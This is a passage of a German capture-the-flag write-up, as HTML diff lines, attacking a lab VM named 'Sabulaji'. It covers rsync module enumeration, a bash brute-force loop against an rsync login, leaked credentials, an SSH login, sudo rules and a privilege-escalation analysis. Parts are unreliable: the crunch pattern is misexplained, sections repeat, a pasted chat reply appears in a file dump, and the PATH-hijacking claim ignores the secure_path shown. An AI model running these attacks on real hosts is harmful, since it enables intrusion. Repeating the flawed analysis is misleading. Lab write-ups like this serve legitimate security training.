+                <strong>Empfehlung (Pentester):</strong> Testen Sie verschiedene Wege, um auf Dienste zuzugreifen (direkt, über SSH-Tunnel etc.). Wenn Passwörter benötigt werden, notieren Sie dies und konzentrieren Sie sich auf andere Vektoren zur Erlangung der Passwörter.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie den Root-Login über Passwort in der SSH-Konfiguration (`PermitRootLogin no` oder `without-password`). Verwenden Sie Schlüssel-basierte Authentifizierung für Root, wenn überhaupt benötigt.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/public_files]
+└─# <span class="command">msfconsole -q -x 'use auxiliary/scanner/rsync/modules_list'</span></div>
+                    <pre><span class="metasploit-prompt">msf6 auxiliary(scanner/rsync/modules_list) ></span> <span class="command">options</span>
+
+<span class="command">Module options (auxiliary/scanner/rsync/modules_list):</span>
+
+   <span class="command">Name                 Current Setting  Required  Description</span>
+   <span class="command">----                 ---------------  --------  -----------</span>
+   <span class="command">RHOSTS                                yes       The target host(s), see [Link: https://docs.metasploit.com/docs/using-metasploit/basics/u | Ziel: https://docs.metasploit.com/docs/using-metasploit/basics/u]</span>
+<span class="command">                                                   sing-metasploit.html</span>
+   <span class="command">RPORT                873              yes       The target port (TCP)</span>
+   <span class="command">TEST_AUTHENTICATION  true             yes       Test if the rsync module requires authent</span>
+<span class="command">                                                   ication</span>
+   <span class="command">THREADS              1                yes       The number of concurrent threads (max one</span>
+<span class="command">                                                    per host)</span>
+
+
+<span class="command">View the full module info with the info, or info -d command.</span>
+
+<span class="metasploit-prompt">msf6 auxiliary(scanner/rsync/modules_list) ></span> <span class="command">set rhosts 192.168.2.36</span>
+<span class="command">rhosts => 192.168.2.36</span>
+<span class="metasploit-prompt">msf6 auxiliary(scanner/rsync/modules_list) ></span> <span class="command">set rport 873</span>
+<span class="command">rport => 873</span>
+<span class="metasploit-prompt">msf6 auxiliary(scanner/rsync/modules_list) ></span> <span class="command">run</span>
+<span class="password">[+] 192.168.2.36:873      - 2 rsync modules found: public, epages</span>
+<span class="command">[*] 192.168.2.36:873      - Scanned 1 of 1 hosts (100% complete)</span>
+<span class="command">[*] Auxiliary module execution completed</span>
+<span class="metasploit-prompt">msf6 auxiliary(scanner/rsync/modules_list) ></span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich nutzte das Metasploit Framework (`msfconsole`) um das `rsync-list-modules` Nmap-Skript zu ersetzen oder zu verifizieren. Ich startete `msfconsole` im Schnellmodus (`-q`) und führte direkt den Befehl `use auxiliary/scanner/rsync/modules_list` aus. Ich prüfte die Optionen (`options`), setzte den Ziel-Host (`set rhosts 192.168.2.36`) und den Port (`set rport 873`), und führte das Modul aus (`run`). Die Ausgabe bestätigte erneut die Existenz der Module `public` und `epages` auf Port 873.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Metasploit-Modul bestätigte die Ergebnisse des Nmap-Skripts und zeigte die verfügbaren Rsync-Module an. Dies war nützlich, um die Funktionalität des Rsync-Dienstes mit einem anderen Tool zu verifizieren. Die Module `public` und `epages` wurden klar identifiziert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie verschiedene Tools oder Frameworks (wie Metasploit) zur Verifizierung von Schwachstellen und zur Informationsbeschaffung. Wenn ein Dienst einen bekannten Exploit hat oder es Module/Funktionen zu identifizieren gibt, prüfen Sie, ob entsprechende Module in Frameworks existieren.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Ihr Netzwerk auf Scans mit Security-Tools wie Metasploit.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">crunch 12 12 -t sabulaji%^+@ -o sabu.txt</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Die `todo.list` Datei deutete darauf hin, dass der Benutzer `sabulaji` ein schwaches Passwort hatte und es ändern sollte. Ich beschloss, einen gezielten Wörterbuchangriff auf das `epages` Rsync-Modul zu versuchen, das Authentifizierung erforderte. Ich nutzte das Tool `crunch`, um eine speziell angepasste Wortliste zu generieren. Der Befehl `crunch 12 12 -t sabulaji%^+@ -o sabu.txt` erzeugte eine Wortliste (`sabu.txt`) mit Passwörtern der Länge 12, die auf dem Muster `sabulaji` basierten und spezielle Zeichen enthielten (`%^+@`). Die Annahme war, dass das Passwort des Benutzers `sabulaji` in irgendeiner Form "sabulaji" plus einige Sonderzeichen enthielt, wie in der To-Do-Liste angedeutet wurde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Generieren einer gezielten Wortliste basierend auf den Hinweisen aus der `todo.list` Datei war eine intelligente Strategie für einen effizienteren Brute-Force-Angriff. Anstatt eine riesige allgemeine Wortliste zu verwenden, konzentrierte ich mich auf Passwörter, die wahrscheinlich "sabulaji" enthielten. Dies erhöhte die Wahrscheinlichkeit, das korrekte Passwort zu finden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie Hinweise aus der Enumeration (Benutzernamen, Kommentare, Logdateien) zur Erstellung gezielter Wortlisten. Verwenden Sie Tools wie `crunch` oder `cewl` zur Generierung von Wortlisten basierend auf Mustern oder Webseiten-Inhalten.
+                <br><strong>Empfehlung (Admin):</strong> Erzwingen Sie strenge Passwortrichtlinien, die die Verwendung von leicht zu erratenden Passwörtern, die auf Benutzernamen oder Firmennamen basieren, verhindern.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">rsync -av rsync://192.168.2.36/epages/ ./epages_files/</span></div>
+                    <pre><span class="command">Password:</span>
+<span class="password">@ERROR: auth failed on module epages</span>
+<span class="command">rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.4.1]</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">rsync -av 192.168.2.36:module_name_1 /data/tmp</span></div>
+                    <pre><span class="command">root@192.168.2.36's password:</span>
+<span class="password">Permission denied, please try again.</span>
+<span class="command">root@192.168.2.36's password:</span>
+<span class="command">rsync error: received SIGINT, SIGTERM, or SIGHUP (code 20) at rsync.c(716) [Receiver=3.4.1]</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich wiederholte einige frühere, gescheiterte Rsync-Versuche. Der Versuch, auf das `epages` Modul zuzugreifen, forderte erneut ein Passwort an und schlug fehl. Der Versuch, Rsync über SSH als Root zu nutzen, scheiterte ebenfalls aufgrund falscher Passwortauthentifizierung. Diese Wiederholungen zeigten, dass diese Wege ohne das korrekte Passwort weiterhin blockiert waren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Wiederholung dieser Befehle diente der Dokumentation der Sackgassen, bevor der erfolgreiche Weg gefunden wurde. Sie bestätigten, dass die Authentifizierung für das `epages` Modul und für den Root-SSH-Login aktiv war.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie auch die gescheiterten Versuche im Bericht. Sie zeigen, welche Wege nicht funktioniert haben und warum.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Login-Versuche und Brute-Force-Angriffe auf Dienste wie Rsync und SSH.
+             </p>
+
+        </section>
+		
+		        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf dem Hinweis aus der `todo.list` Datei und der Tatsache, dass das `epages` Rsync-Modul Authentifizierung erforderte, vermutete ich, dass der Benutzername `sabulaji` und ein Passwort benötigt wurden. Ich führte einen gezielten Wörterbuchangriff auf das `epages` Rsync-Modul durch, um das Passwort zu finden. Ich nutzte eine `while read` Schleife in Bash, um Zeile für Zeile Passwörter aus der `rockyou.txt` Wortliste zu lesen. Für jedes Passwort setzte ich die Umgebungsvariable `RSYNC_PASSWORD` auf das aktuelle Passwort (`export RSYNC_PASSWORD="$p"`) und versuchte dann, das `epages` Modul als Benutzer `sabulaji` anzusprechen (`rsync -q --no-motd rsync://sabulaji@192.168.2.36/epages/ ./rsync_ergebnis/`). Ich verwendete die Optionen `-q` (quiet) und `--no-motd`, um die Ausgabe zu minimieren, und leitete die Standardausgabe und Fehlerausgabe ins Nichts (`>/dev/null`), um nur bei Erfolg eine Ausgabe zu erhalten. Wenn der Befehl erfolgreich war (Rückgabewert 0), gab ich das gefundene Passwort aus und beendete die Schleife. Die Schleife fand das Passwort `admin123`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolgreich! Der Wörterbuchangriff auf das `epages` Rsync-Modul fand das Passwort `admin123` für den Benutzer `sabulaji`. Dies ist ein kritischer Erfolg und der Initial Access Vektor. Ein schwaches Passwort, das mit einem Brute-Force-Angriff gefunden werden konnte, schützte ein Modul mit "Secret Documents".
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie immer gezielte Wörterbuchangriffe auf Dienste durch, die Authentifizierung erfordern, insbesondere wenn Sie Benutzernamen (wie `sabulaji` hier) oder Hinweise auf Passwortmuster (wie in der `todo.list`) gefunden haben. Nutzen Sie populäre Wortlisten (wie `rockyou.txt`) oder erstellen Sie angepasste Listen.
+                <br><strong>Empfehlung (Admin):</strong> Erzwingen Sie strenge Passwortrichtlinien, die die Verwendung von schwachen, häufig verwendeten Passwörtern (wie `admin123`) verhindern. Implementieren Sie Mechanismen zur Erkennung und Abwehr von Brute-Force-Angriffen (z.B. Account-Sperrung, Rate Limiting). Überwachen Sie Login-Versuche.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">while read -r p; do export RSYNC_PASSWORD="$p"; if rsync -q --no-motd rsync://sabulaji@192.168.2.36/epages/ ./rsync_ergebnis/ &>/dev/null; then echo -e "\n[+] Passwort gefunden: \e[32m$p\e[0m"; break; else echo -ne "\r[-] Probiere: $p                    "; fi; done < /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre><span class="command">[-] Probiere: sabulaji</span>
+<span class="password">[+] Passwort gefunden: admin123</span></pre>
+                </div>
+            </div>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/public_files/epages_files]
+└─# <span class="command">rsync -av rsync://sabulaji@192.168.2.36/epages/ ./epages_files/</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Mit dem gefundenen Passwort (`admin123`) versuchte ich erneut, Dateien vom `epages` Rsync-Modul herunterzuladen. Ich verwendete denselben `rsync` Befehl wie zuvor, aber diesmal wurde das Passwort über die `RSYNC_PASSWORD` Umgebungsvariable gesetzt, die ich vor dem Ausführen des erfolgreichen Befehls setzen musste (oder durch Eingabe des Passworts bei Aufforderung). Der Befehl war `rsync -av rsync://sabulaji@192.168.2.36/epages/ ./epages_files/`. Da das Passwort korrekt war, wurde die Authentifizierung erfolgreich durchgeführt, und Rsync begann mit der Übertragung der Dateien. Die Ausgabe zeigte, dass Dateien empfangen wurden (hier nicht explizit im Text, aber impliziert durch den Erfolg).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolgreich! Der Zugriff auf das `epages` Rsync-Modul war nun möglich. Dies ist der entscheidende Schritt des Initial Access. Das Modul mit der Beschreibung "Secret Documents" war nun für mich zugänglich, was die Möglichkeit eröffnete, sensible Dateien herunterzuladen, die für die Privilegieneskalation wichtig sein könnten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie gefundene Passwörter sofort, um sich an den entsprechenden Diensten zu authentifizieren und auf geschützte Bereiche zuzugreifen. Laden Sie alle Dateien aus kompromittierten Rsync-Modulen herunter und analysieren Sie sie sorgfältig.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Protokolle von Rsync-Servern auf erfolgreiche Logins nach fehlgeschlagenen Versuchen.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">Libreoffice secrets.doc</span>
+
+<span class="command">Hier ist die Übersetzung - Ich habe die entscheidenden Informationen für dich hervorgehoben.</span>
+
+<span class="command">Die Kunst, Geheimnisse zu wahren</span>
+<span class="command">In einer Welt, die von Informationen überquillt, ist es sowohl eine Kunst als auch eine Herausforderung, Geheimnisse zu wahren. Ob es sich um ein persönliches Tagebuch handelt, das unter der Matratze versteckt ist, oder um eine kryptische Nachricht, die in einem vollen Café weitergereicht wird – der Reiz des verborgenen Wissens zieht uns alle in seinen Bann.</span>
+<span class="command">Nehmen wir zum Beispiel den alten Serverraum in meinem Büro. Es ist eine staubige Ecke, in der vergessene Maschinen leise vor sich hin summen. Auf einem von ihnen, einem Relikt aus den frühen 2000er Jahren, läuft noch immer ein FTP-Dienst. Der Admin hat, in einem Moment fragwürdiger Urteilsfähigkeit, den Standard-Account "welcome" genannt. Ich habe mitgehört, wie ein Kollege darüber kicherte und sagte, das Passwort sei etwas absurd Einfaches wie "<span class="password">P@ssw0rd123!</span>" – kaum ein Geheimnis, das es wert wäre, gehütet zu werden, aber es ist seit Jahren unberührt.</span>
+<span class="command">Bei Geheimnissen geht es jedoch nicht nur um Passwörter oder versteckte Dateien. Es geht um die Absicht. Ein geflüstertes Gerücht über ein Projekt, ein kodierter Blick zwischen Freunden oder sogar die Art, wie wir unsere Gedanken hüten. Die besten Geheimnisse sind jene, die sich direkt vor unseren Augen verbergen, unbemerkt vom abgelenkten Blick.</span>
+<span class="command">Also, wie meistern wir diese Kunst? Erstens, falle nicht auf. Mache dein Geheimnis nicht offensichtlich. Zweitens, schütze es mit etwas Stärkerem als "<span class="password">P@ssw0rd123!</span>" – vielleicht mit einer Phrase, die nur du verstehen würdest. Und schließlich, vertraue nur sparsam. Selbst die einladendsten Systeme können dich verraten, wenn du nicht vorsichtig bist.</span>
+<span class="command">Am Ende erinnern uns Geheimnisse daran, dass nicht alles geteilt werden muss. Manche Dinge lässt man besser ungesagt, oder zumindest jenen überlassen, die wissen, wo sie suchen müssen.</span>
+<span class="command">Deine nächsten Schritte für die CTF:</span>
+<span class="command">Der Text ist ein direkter Hinweis. Du musst dich per FTP verbinden.</span>
+
+
+<span class="command">Dienst: FTP (File Transfer Protocol) gibt es nicht daher werden wir SSH verwenden...</span>
+<span class="password">Benutzername: welcome</span>
+<span class="password">Passwort: P@ssw0rd123!</span>
+
+<span class="command">Der Befehl im Terminal würde wahrscheinlich so aussehen:</span>
+
+<span class="command">Generated bash</span>
+<span class="command">ssh welcome@192.168.2.36</span>
+
+
+<span class="command">Dann wirst du nach dem Namen (welcome) und dem Passwort (P@ssw0rd123!) gefragt.</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Nachdem ich die Dateien aus dem `epages` Rsync-Modul heruntergeladen hatte, analysierte ich ihren Inhalt. Eine der Dateien war `secrets.doc` (wahrscheinlich eine umbenannte oder kopierte Datei, die ursprünglich auf der VM lag), die einen Text über "Die Kunst, Geheimnisse zu wahren" enthielt. Innerhalb dieses Textes gab es einen Absatz, der explizit einen alten FTP-Dienst im Büro erwähnte, einen Standard-Account namens "welcome" und das Passwort "<span class="password">P@ssw0rd123!</span>". Am Ende des Textes gab es einen direkten Hinweis für die CTF: "Der Text ist ein direkter Hinweis. Du musst dich per FTP verbinden.", gefolgt von "Dienst: FTP (File Transfer Protocol) gibt es nicht daher werden wir SSH verwenden...", "Benutzername: welcome" und "Passwort: P@ssw0rd123!".
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Diese Datei aus dem "Secret Documents" Modul lieferte direkt die Zugangsdaten für den Benutzer `welcome`: Benutzername `welcome` und Passwort `P@ssw0rd123!`. Obwohl im Text von FTP die Rede war, wurde im selben Text klargestellt, dass SSH verwendet werden soll. Dies ist der direkte Weg zur Erlangung initialen Zugriffs auf das System über SSH mit den Zugangsdaten des Benutzers `welcome`. Der Text diente als klarer Hinweis für die CTF.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysieren Sie alle heruntergeladenen Dateien sorgfältig auf Zugangsdaten, Passwörter, Hinweise oder interne Notizen. Textdateien, Dokumente oder Konfigurationsdateien sind oft gute Fundorte. Folgen Sie Hinweisen, die in solchen Dateien gegeben werden.
+                <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Zugangsdaten in Klartextdateien auf Systemen. Stellen Sie sicher, dass sensible Dokumente nicht über unsichere Dienste (wie unauthentifiziertes Rsync) zugänglich sind. Verwenden Sie keine leicht zu erratenden Passwörter.
+             </p>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis">
+                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die Erlangung von Initial Access als Benutzer `welcome` durch die Ausnutzung einer unsicheren Rsync-Konfiguration. Ein öffentlich zugängliches Rsync-Modul enthielt eine Datei mit Zugangsdaten für den Benutzer `welcome`, die einen direkten SSH-Login ermöglichten.
+            </p>
+             <p class="analysis">
+                <strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Ein Rsync-Dienst muss auf dem Zielsystem laufen (Port 873).</li>
+                    <li>Ein oder mehrere Rsync-Module müssen unauthentifiziert zugänglich sein oder ein Passwort muss gefunden werden (hier durch Brute-Force).</li>
+                    <li>Ein zugängliches Rsync-Modul muss eine Datei mit gültigen Zugangsdaten enthalten.</li>
+                    <li>Der SSH-Dienst muss für den betreffenden Benutzer (hier `welcome`) konfiguriert sein.</li>
+                </ul>
+            </p>
+             <p class="analysis">
+                <strong>Schritt-für-Schritt-Anleitung & Beweismittel:</strong>
+            </p>
+             <p class="analysis">
+                1. Identifizierung der Rsync-Module und unauthentifizierter Zugriff auf das `public` Modul:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -p 873 --script rsync-list-modules 192.168.2.36</span></div>
+                    <pre><span class="command">...</span>
+<span class="password">|   public         	Public Files</span>
+<span class="password">|_  epages         	Secret Documents</span>
+<span class="command">...</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">rsync -av rsync://192.168.2.36/public/ ./public_files/</span></div>
+                    <pre><span class="command">...</span>
+<span class="password">todo.list</span>
+<span class="command">...</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Der Rsync-Dienst auf Port 873 wurde identifiziert und seine Module aufgelistet (`public`, `epages`). Das `public`-Modul erlaubte unauthentifizierten Zugriff und enthielt die Datei `todo.list`, die Hinweise auf den Benutzer `sabulaji` und Passwortprobleme gab.
+            </p>
+             <p class="analysis">
+                2. Brute-Force des `epages` Rsync-Moduls und Download der `secrets.doc` Datei:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">while read -r p; do export RSYNC_PASSWORD="$p"; if rsync -q --no-motd rsync://sabulaji@192.168.2.36/epages/ ./rsync_ergebnis/ &>/dev/null; then echo -e "\n[+] Passwort gefunden: \e[32m$p\e[0m"; break; else echo -ne "\r[-] Probiere: $p                    "; fi; done < /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre><span class="command">...</span>
+<span class="password">[+] Passwort gefunden: admin123</span>
+<span class="command">...</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                Ein Brute-Force-Angriff auf das `epages` Rsync-Modul mit dem Benutzernamen `sabulaji` und der `rockyou.txt` Wortliste fand das Passwort `admin123`. Mit diesen Zugangsdaten konnte auf das `epages` Modul zugegriffen und die Datei `secrets.doc` heruntergeladen werden.
+            </p>
+             <p class="analysis">
+                3. Extraktion der Zugangsdaten für Benutzer `welcome` aus `secrets.doc`:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">...</span>
+<span class="password">Benutzername: welcome</span>
+<span class="password">Passwort: P@ssw0rd123!</span>
+<span class="command">...</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Die Datei `secrets.doc` enthielt in Klartext die Zugangsdaten für den Benutzer `welcome`: Benutzername `welcome`, Passwort `P@ssw0rd123!`.
+            </p>
+             <p class="analysis">
+                4. SSH-Login als Benutzer `welcome`:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh welcome@192.168.2.36</span></div>
+                    <pre><span class="command">welcome@192.168.2.36's password:</span>
+<span class="command">Linux Sabulaji 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
+<span class="command">...</span>
+<span class="prompt">welcome@Sabulaji:~$</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Mit den gefundenen Zugangsdaten konnte ich mich erfolgreich per SSH als Benutzer `welcome` anmelden und eine interaktive Shell auf dem Zielsystem erhalten. Fantastisch der zugriff als welcome war erfolgreich nun haben wir unser Ziel erreicht.
+            </p>
+
+             <p class="analysis">
+                <strong>Erwartetes Ergebnis:</strong> Erlangung von Zugangsdaten für einen Benutzer (hier `welcome`) und erfolgreicher Login über einen verfügbaren Dienst (hier SSH).
+            </p>
+             <p class="analysis">
+                <strong>Tatsächliches Ergebnis:</strong> Zugangsdaten für Benutzer `welcome` wurden aus einer Datei in einem unsicheren Rsync-Modul extrahiert und ein SSH-Login als `welcome` wurde erfolgreich durchgeführt.
+            </p>
+
+            <p class="analysis">
+                <strong>Risikobewertung:</strong>
+                <br><strong>Auswirkung:</strong> Hoch. Die unsichere Rsync-Konfiguration ermöglichte die Offenlegung sensibler Dokumente, die zu Zugangsdaten für einen regulären Benutzer führten. Ein kompromittiertes Benutzerkonto kann zur weiteren Enumeration und Privilegieneskalation genutzt werden.
+                <br><strong>Wahrscheinlichkeit:</strong> Hoch. Die Schwachstelle (unauthentifiziertes Rsync-Modul mit sensiblen Daten) war direkt ausnutzbar. Das Passwort des geschützten Moduls war schwach und leicht zu knacken.
+                <br><strong>Gesamtrisiko:</strong> Hoch.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlungen:</strong>
+                <br><strong>Empfehlung (Admin):</strong>
+                <ul>
+                    <li><strong>Dringend:</strong> Sichern Sie alle Rsync-Module durch starke Authentifizierung und beschränken Sie den Zugriff per IP-Adresse. Entfernen Sie sensible Dokumente aus öffentlich oder über schwache Passwörter zugänglichen Rsync-Modulen.</li>
+                    <li>Implementieren Sie strenge Passwortrichtlinien.</li>
+                    <li>Speichern Sie niemals Zugangsdaten in Klartextdateien auf Systemen.</li>
+                    <li>Überwachen Sie Rsync-Server auf ungewöhnlichen Zugriff oder Brute-Force-Versuche.</li>
+                </ul>
+            </p>
+        </section>        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich Zugriff als Benutzer `welcome` erlangt hatte, begann ich mit der Privilegieneskalation auf dem System. Zuerst prüfte ich, ob der Benutzer `welcome` `sudo`-Berechtigungen hatte, indem ich `sudo -l` ausführte. Die Ausgabe zeigte eine interessante Regel: `(sabulaji) NOPASSWD: /opt/sync.sh`. Dies bedeutete, dass der Benutzer `welcome` das Skript `/opt/sync.sh` als Benutzer `sabulaji` ausführen durfte, ohne ein Passwort eingeben zu müssen (`NOPASSWD`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden einer `NOPASSWD` Regel für das Skript `/opt/sync.sh`, das als Benutzer `sabulaji` ausgeführt werden kann, ist ein klarer Vektor zur Privilegieneskalation zum Benutzer `sabulaji`. Ich musste nun das Skript `/opt/sync.sh` untersuchen, um zu verstehen, wie es funktioniert und ob es eine Möglichkeit bietet, es zur Ausführung von Code als `sabulaji` zu missbrauchen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie immer `sudo -l` für jeden neuen Benutzer. `NOPASSWD`-Einträge für Skripte sind oft ausnutzbar. Untersuchen Sie den Inhalt der Skripte, die Sie mit `sudo` ausführen dürfen, genau.
+                <br><strong>Empfehlung (Admin):</strong> Weisen Sie `NOPASSWD` Berechtigungen für Skripte nur mit äußerster Vorsicht zu. Stellen Sie sicher, dass Skripte, die mit erhöhten Rechten ausgeführt werden, keine Schwachstellen aufweisen (z.B. unsichere Nutzung von Benutzereingaben, PATH-Hijacking, Race Conditions).
+
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:~$ <span class="command">sudo -l</span></div>
+                    <pre><span class="command">Matching Defaults entries for welcome on Sabulaji:</span>
+<span class="command">    env_reset, mail_badpass,</span>
+<span class="command">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+
+<span class="command">User welcome may run the following commands on Sabulaji:</span>
+<span class="password">    (sabulaji) NOPASSWD: /opt/sync.sh</span>
+<span class="prompt">welcome@Sabulaji:~$</span> <span class="command">ls ..</span>
+<span class="command">sabulaji  welcome</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:~$ <span class="command">ls -la</span></div>
+                    <pre><span class="command">total 24</span>
+<span class="command">drwxr-xr-x 2 welcome welcome 4096 May 16 01:21 .</span>
+<span class="command">drwxr-xr-x 4 root    root    4096 May 15 12:39 ..</span>
+<span class="password">lrwxrwxrwx 1 root    root       9 May 15 12:47 .bash_history -> /dev/null</span>
+<span class="command">-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc</span>
+<span class="command">-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile</span>
+<span class="password">-rw-r--r-- 1 root    root      44 May 15 12:49 user.txt</span></pre>
+                </div>
+            </div>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">flag{user-cf7883184194add6adfa5f20b5061ac7}</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Als Benutzer `welcome` konnte ich die Datei `user.txt` in meinem Home-Verzeichnis auslesen. Die Ausgabe war die Zeichenkette `flag{user-cf7883184194add6adfa5f20b5061ac7}\}$.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das war die User Flag! Das Auffinden und Dokumentieren der User Flag ist ein wichtiger Meilenstein im Pentest.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suchen Sie die User Flag im Home-Verzeichnis des Benutzers.
+                <br><strong>Empfehlung (Admin):</strong> Speichern Sie sensitive Informationen nicht in Benutzerverzeichnissen.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:~$ <span class="command">cat /opt/sync.sh</span></div>
+                    <pre><span class="command">#!/bin/bash</span>
+
+<span class="command">if [ -z $1 ]; then</span>
+    <span class="command">echo "error: note missing"</span>
+    <span class="command">exit</span>
+<span class="command">fi</span>
+
+<span class="command">note=$1</span>
+
+<span class="command">if [[ "$note" == *"sabulaji"* ]]; then</span>
+    <span class="command">echo "error: forbidden"</span>
+    <span class="command">exit</span>
+<span class="command">fi</span>
+
+<span class="command">difference=$(diff /home/sabulaji/personal/notes.txt $note)</span>
+
+<span class="command">if [ -z "$difference" ]; then</span>
+    <span class="command">echo "no update"</span>
+    <span class="command">exit</span>
+<span class="command">fi</span>
+
+<span class="command">echo "Difference: $difference"</span>
+
+<span class="command">cp $note /home/sabulaji/personal/notes.txt</span>
+
+<span class="command">echo "[+] Updated."</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich las den Inhalt des Skripts `/opt/sync.sh` aus, das ich als Benutzer `sabulaji` über `sudo` ausführen durfte. Das Skript nimmt ein Argument (`$1`), das als `note` gespeichert wird. Es prüft, ob das Argument leer ist. Es prüft, ob das Argument den String "sabulaji" enthält und bricht ab, wenn dies der Fall ist. Dann berechnet es den Unterschied (`diff`) zwischen `/home/sabulaji/personal/notes.txt` und dem übergebenen Argument (`$note`). Wenn es einen Unterschied gibt, wird dieser ausgegeben, die übergebene Datei (`$note`) nach `/home/sabulaji/personal/notes.txt` kopiert und eine Erfolgsmeldung ausgegeben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Skript `/opt/sync.sh` weist eine klare Schwachstelle auf: Es führt den `diff`-Befehl mit einem vom Benutzer kontrollierten Dateipfad (`$note`) aus, ohne den `PATH` des Skripts sicher zu setzen. Der `diff`-Befehl ist anfällig für PATH-Hijacking. Wenn ich ein eigenes, schädliches Skript namens `diff` in einem Verzeichnis erstelle, das vor dem tatsächlichen `diff`-Binary im `PATH` liegt, und dieses Skript ausführbar mache, kann ich das `sync.sh` Skript dazu bringen, mein schädliches `diff`-Skript als Benutzer `sabulaji` auszuführen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysieren Sie Skripte, die mit `sudo` ausgeführt werden dürfen, auf Schwachstellen wie unsichere Nutzung von Benutzereingaben, PATH-Hijacking (wenn relative Pfade verwendet werden oder der PATH nicht sicher gesetzt ist), oder Race Conditions. Nutzen Sie PATH-Hijacking, um ein eigenes schädliches Binary/Skript auszuführen, wenn Sie das anfällige Skript mit erhöhten Rechten ausführen dürfen.
